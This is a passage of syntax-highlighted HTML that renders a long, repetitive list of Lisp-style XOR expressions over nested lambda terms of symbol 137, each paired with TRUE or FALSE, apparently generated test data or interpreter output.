class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span 